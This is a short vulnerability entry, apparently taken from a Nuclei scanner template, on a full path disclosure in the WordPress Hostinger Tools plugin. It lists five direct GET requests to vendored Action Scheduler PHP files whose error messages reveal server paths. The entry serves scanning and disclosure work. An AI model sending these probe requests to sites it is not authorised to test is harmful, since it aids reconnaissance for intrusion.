# Vulnerability: WordPress Hostinger Tools - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-hostinger-fpd.yaml`)

## Description
WordPress Plugin Hostinger Tools files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/hostinger/vendor/woocommerce/action-scheduler/classes/ActionScheduler_AdminView.php
GET {{BaseURL}}/wp-content/plugins/hostinger/vendor/woocommerce/action-scheduler/classes/ActionScheduler_ListTable.php
GET {{BaseURL}}/wp-content/plugins/hostinger/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_QueueRunner.php
GET {{BaseURL}}/wp-content/plugins/hostinger/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Store.php
GET {{BaseURL}}/wp-content/plugins/hostinger/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php
```

